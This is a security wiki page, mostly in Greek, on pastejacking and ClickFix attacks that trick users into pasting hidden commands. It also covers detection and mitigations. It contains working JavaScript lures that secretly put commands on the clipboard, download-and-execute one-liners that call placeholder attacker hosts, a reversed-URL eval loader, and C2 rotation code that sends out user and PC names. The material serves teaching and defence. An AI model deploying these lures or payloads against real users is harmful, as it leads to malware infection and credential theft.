# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Μην επικολλάτε ποτέ κάτι που δεν αντιγράψατε εσείς οι ίδιοι." – παλιά αλλά ακόμα έγκυρη συμβουλή

## Επισκόπηση

Το Clipboard hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συνήθως αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη σελίδα web (ή οποιοδήποτε περιβάλλον που υποστηρίζει JavaScript, όπως μια Electron ή Desktop εφαρμογή) τοποθετεί προγραμματιστικά κείμενο που ελέγχεται από τον επιτιθέμενο στο σύστημα του clipboard. Τα θύματα ενθαρρύνονται, συνήθως μέσω επιμελώς σχεδιασμένων οδηγιών κοινωνικής μηχανικής, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα τερματικό και *paste* το περιεχόμενο του clipboard, εκτελώντας αμέσως αυθαίρετες εντολές.

Επειδή **δεν κατεβαίνει κανένα αρχείο και δεν ανοίγει κανένα συνημμένο**, η τεχνική παρακάμπτει τους περισσότερους ελέγχους ασφάλειας e-mail και web περιεχομένου που παρακολουθούν συνημμένα, macros ή άμεση εκτέλεση εντολών. Η επίθεση είναι επομένως δημοφιλής σε phishing καμπάνιες που διανέμουν κοινές οικογένειες malware όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Παλαιότερες καμπάνιες χρησιμοποιούσαν `document.execCommand('copy')`, οι νεότερες βασίζονται στην ασύγχρονη **Clipboard API** (`navigator.clipboard.writeText`).

## Η ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν typosquatted ή compromised ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Εισαχθέν JavaScript **ClearFake** καλεί έναν helper `unsecuredCopyToClipboard()` που σιωπηλά αποθηκεύει ένα Base64-encoded PowerShell one-liner στο clipboard.
3. Οι HTML οδηγίες λένε στο θύμα: *“Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.”*
4. `powershell.exe` εκτελείται, κατεβάζοντας ένα αρχείο που περιέχει ένα νόμιμο εκτελέσιμο μαζί με ένα κακόβουλο DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, εισάγει shellcode και εγκαθιστά persistence (π.χ. scheduled task) – τελικά εκτελώντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Παράδειγμα αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (νόμιμο Java WebStart) ψάχνει τον κατάλογό του για `msvcp140.dll`.
* Το κακόβουλο DLL επιλύει δυναμικά τα APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας rolling XOR key `"https://google.com/"`, εγχέει το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει το `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Κατεβάζει ένα MSI payload → τοποθετεί το `libcef.dll` δίπλα σε μια signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση της **mshta** εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, αποσυμπιέζει το `Boat.pst` (CAB), ανασυνθέτει το `AutoIt3.exe` μέσω `extrac32` και συνένωσης αρχείων και τελικά εκτελεί ένα `.a3x` script το οποίο εξάγει τα διαπιστευτήρια του browser στο `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες καμπάνιες ClickFix παραλείπουν εντελώς τη λήψη αρχείων και ζητούν από τα θύματα να επικολλήσουν ένα one‑liner που κατεβάζει και εκτελεί JavaScript μέσω WSH, το κάνει μόνιμο και αλλάζει το C2 καθημερινά. Παράδειγμα παρατηρημένης αλυσίδας:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Κύρια χαρακτηριστικά
- Συγκαλυμμένο URL που αντιστρέφεται κατά το runtime ώστε να εξουδετερωθεί ο επιφανειακός έλεγχος.
- JavaScript διατηρεί την παρουσία του μέσω Startup LNK (WScript/CScript) και επιλέγει το C2 με βάση την τρέχουσα ημέρα — επιτρέποντας γρήγορη domain rotation.

Ελάχιστο JS απόσπασμα που χρησιμοποιείται για να περιστρέψει τα C2s ανά ημερομηνία:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιδρύει persistence και τραβάει ένα RAT (e.g., PureHVNC), συχνά pinning TLS σε ένα hardcoded certificate και chunking την κίνηση.

Detection ideas specific to this variant
- Δέντρο διεργασιών: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Σελίδες επαλήθευσης τύπου IUAM (ClickFix Generator): αντιγραφή clipboard-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) that coerce users into copying OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works across Windows and macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence της αρχικής εκτέλεσης
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχίζεται μετά το κλείσιμο του τερματικού, μειώνοντας τα εμφανή artifacts.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες ανίχνευσης και κυνήγι ειδικά για δολώματα τύπου IUAM

- Web: Σελίδες που συνδέουν το Clipboard API με verification widgets; ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του περιεχομένου του clipboard; `navigator.userAgent` διακλάδωση; Tailwind + αντικατάσταση σε single-page σε ύποπτα πλαίσια.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από αλληλεπίδραση με τον browser; batch/MSI installers που εκτελούνται από `%TEMP%`.
- macOS endpoint: Terminal/iTerm που εκκινεί `bash`/`curl`/`base64 -d` με `nohup` κοντά σε συμβάντα του browser; background jobs που επιβιώνουν μετά το κλείσιμο του τερματικού.
- Συσχετίστε το `RunMRU` Win+R history και τις εγγραφές clipboard με μετέπειτα δημιουργία διεργασιών κονσόλας.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Μέτρα μετριασμού

1. Σκληροποίηση browser – απενεργοποιήστε την πρόσβαση εγγραφής στο clipboard (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε χειρονομία χρήστη.
2. Ευαισθητοποίηση ασφάλειας – διδάξτε τους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε έναν επεξεργαστή κειμένου.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για να μπλοκάρουν αυθαίρετα one-liners.
4. Δικτυακοί έλεγχοι – μπλοκάρετε εξερχόμενα αιτήματα προς γνωστά pastejacking και malware C2 domains.

## Σχετικά τεχνάσματα

* **Discord Invite Hijacking** συχνά καταχράται την ίδια προσέγγιση ClickFix αφού δελεάσει τους χρήστες σε κακόβουλο server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Αναφορές

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
